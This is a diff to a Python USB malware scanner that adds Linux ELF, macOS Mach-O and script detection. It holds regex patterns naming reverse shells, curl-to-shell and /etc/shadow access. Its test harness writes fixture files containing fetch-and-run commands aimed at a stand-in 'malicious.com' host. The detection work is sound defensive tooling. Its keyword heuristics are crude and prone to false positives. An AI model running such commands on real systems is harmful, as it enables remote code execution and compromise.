@@ -1,6 +1,6 @@
 #!/usr/bin/env python3
 """
-Praxion 0.1 - USB Malware Scanner & Cleaner (Enhanced Detection)
+Praxion 0.1 - Common USB Malware Scanner & Cleaner
 Copyright (c) 2025 praveen k
 this program is the free software : you can redistribute it and / or modify it under the MIT LICENSE
 
@@ -8,6 +8,9 @@ Features:
 - Enhanced YARA rules for common malware patterns
 - Expanded fallback heuristics with additional suspicious patterns
 - Improved PE analysis with more suspicious API detection
+- Linux ELF analysis and malware detection
+- macOS Mach-O analysis and malware detection  
+- Cross-platform script detection (Python, Node.js, etc.)
 - Safe quarantine copy with evidence JSON
 - ssdeep hashing
 - PE quick-check (pefile) heuristic
@@ -80,6 +83,11 @@ YARA_TARGET_EXTS = {
 YARA_MAX_SIZE = 50 * 1024 * 1024  # 50 MB
 MAX_WORKERS = 4
 STABLE_WAIT_TIMEOUT = 3.0
+
+# Cross-platform configuration
+CURRENT_PLATFORM = platform.system().lower()
+if CURRENT_PLATFORM == "darwin":
+    CURRENT_PLATFORM = "mac"
 
 # ensure folders exist
 os.makedirs(LOG_DIR, exist_ok=True)
@@ -218,6 +226,294 @@ try:
     WATCHDOG_AVAILABLE = True
 except Exception:
     WATCHDOG_AVAILABLE = False
+
+# ==================== LINUX MALWARE DETECTION ====================
+
+def elf_quick_check(path):
+    """Enhanced ELF file analysis for Linux"""
+    if not os.path.exists(path):
+        return None
+    
+    try:
+        with open(path, "rb") as f:
+            header = f.read(4)
+            if header != b'\x7fELF':
+                return None
+    except:
+        return None
+    
+    suspicious = {
+        "suspicious_imports": [],
+        "suspicious_sections": [],
+        "packer_indicators": [],
+        "analysis": {}
+    }
+    
+    try:
+        # Basic ELF structure analysis
+        with open(path, "rb") as f:
+            data = f.read(4096)  # Read first 4KB for analysis
+            
+        # Check for UPX packing
+        if b'UPX!' in data:
+            suspicious["packer_indicators"].append("UPX_packed")
+            
+        # Check for common malware behaviors in strings
+        text = data.decode('latin-1', errors='ignore').lower()
+        
+        # Linux-specific suspicious patterns
+        linux_malware_indicators = [
+            # System manipulation
+            (r"/etc/passwd", "password_file_access"),
+            (r"/etc/shadow", "shadow_file_access"),
+            (r"/etc/ld\.so\.preload", "ld_preload_hijack"),
+            (r"ptrace", "debugger_evasion"),
+            (r"inotify", "file_monitoring"),
+            (r"netlink", "kernel_communication"),
+            
+            # Persistence mechanisms
+            (r"/etc/rc\.local", "rc_local_persistence"),
+            (r"/etc/cron\.", "cron_persistence"),
+            (r"/etc/systemd/", "systemd_persistence"),
+            (r"~/.bashrc", "bashrc_persistence"),
+            (r"~/.profile", "profile_persistence"),
+            
+            # Network suspicious activities
+            (r"raw_socket", "raw_socket_access"),
+            (r"packet_socket", "packet_sniffing"),
+            
+            # Cryptomining
+            (r"stratum\+tcp", "cryptomining_pool"),
+            (r"xmrig", "xmrig_miner"),
+            (r"cpuminer", "cpu_miner"),
+            
+            # Keylogging (Linux)
+            (r"x11", "x11_keylogging"),
+            (r"xinput", "xinput_keylogging"),
+            (r"evdev", "evdev_keylogging"),
+        ]
+        
+        for pattern, description in linux_malware_indicators:
+            if re.search(pattern, text, re.IGNORECASE):
+                suspicious["suspicious_imports"].append(description)
+                
+    except Exception as e:
+        suspicious["analysis"]["error"] = str(e)
+    
+    return suspicious if suspicious["suspicious_imports"] or suspicious["packer_indicators"] else None
+
+def analyze_linux_script(path):
+    """Analyze Linux shell scripts for malicious content"""
+    try:
+        with open(path, "r", encoding='utf-8', errors='ignore') as f:
+            content = f.read().lower()
+    except:
+        return None
+    
+    suspicious = []
+    
+    linux_script_patterns = [
+        # Dangerous commands with obfuscation
+        (r"curl.*\|.*sh", "curl_pipe_shell"),
+        (r"wget.*\|.*sh", "wget_pipe_shell"),
+        (r"base64.*-d.*\|.*sh", "base64_decode_shell"),
+        
+        # System modification
+        (r"chmod.*[67][67][67]", "suspicious_permissions"),
+        (r"chattr.*\+i", "immutable_flag_set"),
+        (r"setuid", "setuid_bit_manipulation"),
+        
+        # Network suspicious
+        (r"nc.*-e.*/bin/sh", "netcat_reverse_shell"),
+        (r"bash.*-i.*>&.*/dev/tcp", "bash_reverse_shell"),
+        (r"ssh.*-o.*StrictHostKeyChecking=no", "ssh_key_checking_disabled"),
+        
+        # Cryptomining in scripts
+        (r"minerd", "cpu_miner"),
+        (r"cgminer", "gpu_miner"),
+        (r"pool.*stratum", "mining_pool"),
+        
+        # Download and execute
+        (r"wget.*-O.*/tmp/", "download_to_tmp"),
+        (r"curl.*-o.*/tmp/", "curl_download_to_tmp"),
+    ]
+    
+    for pattern, description in linux_script_patterns:
+        if re.search(pattern, content, re.IGNORECASE):
+            suspicious.append(description)
+    
+    return suspicious if suspicious else None
+
+# ==================== MAC MALWARE DETECTION ====================
+
+def macho_quick_check(path):
+    """Enhanced Mach-O file analysis for macOS"""
+    if not os.path.exists(path):
+        return None
+    
+    try:
+        with open(path, "rb") as f:
+            magic = f.read(4)
+            # Mach-O magic numbers
+            if magic not in [b'\xfe\xed\xfa\xce', b'\xfe\xed\xfa\xcf', 
+                           b'\xce\xfa\xed\xfe', b'\xcf\xfa\xed\xfe']:
+                return None
+    except:
+        return None
+    
+    suspicious = {
+        "suspicious_imports": [],
+        "suspicious_frameworks": [],
+        "analysis": {}
+    }
+    
+    try:
+        with open(path, "rb") as f:
+            data = f.read(8192)  # Read more for string analysis
+            
+        text = data.decode('latin-1', errors='ignore').lower()
+        
+        # macOS-specific suspicious patterns
+        mac_malware_indicators = [
+            # Persistence mechanisms
+            (r"launchd", "launchd_persistence"),
+            (r"launchctl", "launchctl_command"),
+            (r"/Library/LaunchDaemons", "launch_daemon"),
+            (r"/Library/LaunchAgents", "launch_agent"),
+            (r"~/Library/LaunchAgents", "user_launch_agent"),
+            
+            # Suspicious frameworks
+            (r"CoreServices", "core_services_access"),
+            (r"Security", "security_framework"),
+            (r"AuthorizationExecuteWithPrivileges", "privilege_escalation"),
+            
+            # Keylogging (macOS)
+            (r"CGEventTapCreate", "event_tap_keylogging"),
+            (r"NSEvent", "ns_event_monitoring"),
+            (r"IOKit", "iokit_access"),
+            
+            # Cryptomining
+            (r"stratum", "mining_pool"),
+            (r"xmrig", "xmrig_miner"),
+            
+            # Network suspicious
+            (r"CFSocket", "socket_creation"),
+            (r"NSConnection", "network_connection"),
+        ]
+        
+        for pattern, description in mac_malware_indicators:
+            if re.search(pattern, text, re.IGNORECASE):
+                suspicious["suspicious_imports"].append(description)
+                
+    except Exception as e:
+        suspicious["analysis"]["error"] = str(e)
+    
+    return suspicious if suspicious["suspicious_imports"] else None
+
+def analyze_mac_script(path):
+    """Analyze macOS scripts (AppleScript, shell) for malicious content"""
+    try:
+        with open(path, "r", encoding='utf-8', errors='ignore') as f:
+            content = f.read().lower()
+    except:
+        return None
+    
+    suspicious = []
+    
+    mac_script_patterns = [
+        # AppleScript suspicious patterns
+        (r"do shell script", "apple_shell_script"),
+        (r"administrator privileges", "apple_script_privileges"),
+        (r"with administrator privileges", "admin_privileges_request"),
+        
+        # macOS-specific persistence
+        (r"launchctl load", "launchctl_persistence"),
+        (r"defaults write", "defaults_persistence"),
+        (r"login item", "login_item_persistence"),
+        
+        # File system manipulation
+        (r"chmod.*\+x", "make_executable"),
+        (r"chflags hidden", "hide_files"),
+        
+        # Network suspicious
+        (r"curl.*bash", "curl_to_bash"),
+        (r"wget.*sh", "wget_to_shell"),
+    ]
+    
+    for pattern, description in mac_script_patterns:
+        if re.search(pattern, content, re.IGNORECASE):
+            suspicious.append(description)
+    
+    return suspicious if suspicious else None
+
+# ==================== CROSS-PLATFORM SCRIPT DETECTION ====================
+
+def analyze_cross_platform_scripts(path):
+    """Analyze cross-platform scripts (Python, Node.js, etc.)"""
+    ext = os.path.splitext(path)[1].lower()
+    
+    try:
+        with open(path, "r", encoding='utf-8', errors='ignore') as f:
+            content = f.read().lower()
+    except:
+        return None
+    
+    suspicious = []
+    
+    # Python malware patterns
+    python_patterns = [
+        (r"import os.*subprocess", "subprocess_import"),
+        (r"exec\(.*compile", "dynamic_code_execution"),
+        (r"__import__\(", "dynamic_import"),
+        (r"keyboard.*hook", "python_keylogger"),
+        (r"pynput", "pynput_keylogger"),
+        (r"requests.*post", "data_exfiltration"),
+        (r"urllib.*urlopen", "network_communication"),
+        (r"base64.*b64decode", "base64_obfuscation"),
+        (r"eval\(.*base64", "eval_base64_obfuscation"),
+        (r"ctypes.*windll", "ctypes_windows_api"),
+        (r"ctypes.*cdll", "ctypes_library_load"),
+    ]
+    
+    # Node.js malware patterns
+    nodejs_patterns = [
+        (r"require\(['\"]child_process['\"]", "child_process_require"),
+        (r"execSync", "synchronous_execution"),
+        (r"spawnSync", "process_spawning"),
+        (r"keylogger", "keylogger_mention"),
+        (r"require\(['\"]os['\"]", "os_module"),
+        (r"process\.env", "environment_access"),
+        (r"fs\.writeFile", "file_system_write"),
+        (r"http\.request", "http_requests"),
+        (r"net\.connect", "network_connection"),
+    ]
+    
+    # Generic script patterns
+    generic_patterns = [
+        (r"base64.*decode", "base64_decoding"),
+        (r"eval\(.*atob", "javascript_eval_base64"),
+        (r"Function\(.*\)", "javascript_dynamic_function"),
+        (r"powershell.*-encodedcommand", "powershell_encoded"),
+        (r"python.*-c", "python_command_line"),
+        (r"node.*-e", "nodejs_command_line"),
+    ]
+    
+    if ext == '.py':
+        for pattern, description in python_patterns:
+            if re.search(pattern, content, re.IGNORECASE):
+                suspicious.append(f"python_{description}")
+    
+    elif ext in ['.js', '.node']:
+        for pattern, description in nodejs_patterns:
+            if re.search(pattern, content, re.IGNORECASE):
+                suspicious.append(f"nodejs_{description}")
+    
+    # Check generic patterns for all script types
+    for pattern, description in generic_patterns:
+        if re.search(pattern, content, re.IGNORECASE):
+            suspicious.append(f"generic_{description}")
+    
+    return suspicious if suspicious else None
 
 # ---------------- VirusTotal API Integration ----------------
 def virustotal_scan_file(file_path, api_key, timeout=30):
@@ -547,6 +843,37 @@ def builtin_scan(path):
     name = os.path.basename(path)
     ext = os.path.splitext(name)[1].lower()
     
+    # Platform-specific analysis
+    if CURRENT_PLATFORM == "linux":
+        # ELF analysis
+        elf_result = elf_quick_check(path)
+        if elf_result:
+            matches.append({"type": "elf_analysis", "pattern": elf_result})
+        
+        # Linux script analysis
+        if ext in ['.sh', '.bash', '.zsh']:
+            script_result = analyze_linux_script(path)
+            if script_result:
+                matches.append({"type": "linux_script", "pattern": script_result})
+    
+    elif CURRENT_PLATFORM == "mac":
+        # Mach-O analysis
+        macho_result = macho_quick_check(path)
+        if macho_result:
+            matches.append({"type": "macho_analysis", "pattern": macho_result})
+        
+        # macOS script analysis
+        if ext in ['.sh', '.bash', '.zsh', '.scpt', '.applescript']:
+            script_result = analyze_mac_script(path)
+            if script_result:
+                matches.append({"type": "mac_script", "pattern": script_result})
+    
+    # Cross-platform script analysis (runs on all platforms)
+    if ext in ['.py', '.js', '.node', '.rb', '.pl', '.php']:
+        script_result = analyze_cross_platform_scripts(path)
+        if script_result:
+            matches.append({"type": "cross_platform_script", "pattern": script_result})
+    
     # Enhanced filename checks
     filename_checks = [
         (re.compile(r"(?i:^autorun\.inf$)"), "autorun_filename"),
@@ -666,7 +993,7 @@ def builtin_scan(path):
         _write_log(f"[DEBUG] builtin_scan({path}) -> {uniq}", DEBUG_LOG_FILE)
     return uniq
 
-# ---------------- Explanation helper ----------------
+# ---------------- Enhanced Explanation helper ----------------
 def explanation_for_reasons(reasons):
     lines = []
     if reasons is None:
@@ -715,6 +1042,21 @@ def explanation_for_reasons(reasons):
                         else:
                             add_block(f"Suspicious Content: {pat}", "Strings commonly found in malware.", 
                                     "May drop or execute payloads.", "Analyze in isolated environment.")
+                    elif typ == "elf_analysis":
+                        add_block("Linux ELF Malware", "Suspicious executable characteristics detected", 
+                                "May install persistence, keylogger, or backdoor", "Do not execute; analyze in sandbox")
+                    elif typ == "macho_analysis":
+                        add_block("macOS Mach-O Malware", "Suspicious macOS executable detected",
+                                "May gain persistence via launchd or install keylogger", "Do not run on Mac systems")
+                    elif typ == "linux_script":
+                        add_block("Malicious Linux Script", "Suspicious shell script patterns",
+                                "May download malware, modify system files, or create backdoors", "Do not execute; review script content")
+                    elif typ == "mac_script":
+                        add_block("Malicious macOS Script", "Suspicious AppleScript or shell script",
+                                "May request admin privileges or install persistence", "Do not run; check script source")
+                    elif typ == "cross_platform_script":
+                        add_block("Cross-Platform Malicious Script", "Suspicious Python/Node.js/Ruby code",
+                                "May run on multiple platforms, steal data, or download malware", "Do not execute; analyze code")
                     else:
                         add_block("Suspicious Pattern", f"Pattern: {pat}", "Could be malicious.", "Do not execute; analyze.")
             elif k == "yara":
@@ -1124,7 +1466,7 @@ else:
     def start_watchdog_for_mount(mountpoint):
         return None
 
-# ---------------- Scanning logic ----------------
+# ---------------- Enhanced Scanning logic ----------------
 _scanning_lock = threading.Lock()
 _scanning_set = set()
 
@@ -1144,6 +1486,27 @@ def scan_file(path, drive_root, drive_label):
             simple_report_console(path, drive_label, "SAFE", reasons="skipped - not found")
             return
 
+        # Platform-specific executable analysis
+        if CURRENT_PLATFORM == "linux":
+            elf_result = elf_quick_check(path)
+            if elf_result:
+                simple_report_console(path, drive_label, "MALICIOUS", {"elf_analysis": elf_result})
+                return
+                
+        elif CURRENT_PLATFORM == "mac":
+            macho_result = macho_quick_check(path)
+            if macho_result:
+                simple_report_console(path, drive_label, "MALICIOUS", {"macho_analysis": macho_result})
+                return
+        
+        # Cross-platform script analysis
+        ext = os.path.splitext(path)[1].lower()
+        if ext in ['.py', '.js', '.node', '.rb', '.pl', '.php', '.sh', '.bash']:
+            script_result = analyze_cross_platform_scripts(path)
+            if script_result:
+                simple_report_console(path, drive_label, "MALICIOUS", {"cross_platform_script": script_result})
+                return
+
         # ClamAV scan
         try:
             if CLAMSCAN_PATH:
@@ -1155,7 +1518,7 @@ def scan_file(path, drive_root, drive_label):
         except Exception:
             pass
 
-        # Enhanced PE analysis
+        # Enhanced PE analysis (Windows)
         try:
             pe_res = pe_quick_check(path)
             if pe_res:
@@ -1257,7 +1620,7 @@ def scan_drive(mountpoint):
         with _scanning_lock:
             _scanning_set.discard(mountpoint)
 
-# ---------------- Banner ----------------
+# ---------------- Enhanced Banner ----------------
 BANNER = r"""
 
 ██████╗ ██████╗  █████╗ ██╗  ██╗██╗ ██████╗ ███╗   ██╗     ██████╗    ██╗
@@ -1267,14 +1630,15 @@ BANNER = r"""
 ██║     ██║  ██║██║  ██║██╔╝ ██╗██║╚██████╔╝██║ ╚████║    ╚██████╔╝██╗██║
 ╚═╝     ╚═╝  ╚═╝╚═╝  ╚═╝╚═╝  ╚═╝╚═╝ ╚═════╝ ╚═╝  ╚═══╝     ╚═════╝ ╚═╝╚═╝
                                                                           
- Common Malware Detection - Version 0.2     
+ Commonn Malware Detection - Version 0.2     
+ Windows PE | Linux ELF | macOS Mach-O | Cross-Platform Scripts
  Scanning USB & removable drives in real-time   
  Optional VirusTotal API integration        
                             
 """
 
 
-# ---------------- Test harness ----------------
+# ---------------- Enhanced Test harness ----------------
 def create_test_samples(target_dir):
     os.makedirs(target_dir, exist_ok=True)
     try:
@@ -1314,14 +1678,45 @@ def create_test_samples(target_dir):
             f.write(b"URLDownloadToFile")
     except Exception:
         pass
+    
+    # Cross-platform test samples
+    try:
+        with open(os.path.join(target_dir, "suspicious_linux_elf"), "wb") as f:
+            f.write(b'\x7fELF')
+            f.write(b"\x00" * 100)
+            f.write(b"/etc/passwd")
+            f.write(b"ptrace")
+    except Exception:
+        pass
+    
+    try:
+        with open(os.path.join(target_dir, "malicious_script.py"), "w", encoding="utf-8") as f:
+            f.write("import os, subprocess\nsubprocess.call(['curl', 'http://malicious.com/payload.sh', '|', 'sh'])\n")
+    except Exception:
+        pass
+    
+    try:
+        with open(os.path.join(target_dir, "suspicious_shell.sh"), "w", encoding="utf-8") as f:
+            f.write("#!/bin/bash\ncurl http://malicious.com/payload | bash\n")
+    except Exception:
+        pass
 
 # ---------------- Main ----------------
 def main():
-    global VIRUSTOTAL_ENABLED  # FIX: Added global declaration
+    global VIRUSTOTAL_ENABLED
     
     print(BANNER)
     ensure_dependencies()
     load_builtin_rules()
+    
+    # Display platform info
+    info(f"Running on platform: {CURRENT_PLATFORM}")
+    if CURRENT_PLATFORM == "linux":
+        info("Linux ELF analysis enabled")
+    elif CURRENT_PLATFORM == "mac":
+        info("macOS Mach-O analysis enabled")
+    elif CURRENT_PLATFORM == "windows":
+        info("Windows PE analysis enabled")
     
     # Check VirusTotal configuration
     if VIRUSTOTAL_ENABLED:
@@ -1386,5 +1781,4 @@ def main():
                 pass
 
 if __name__ == "__main__":
-
     main()
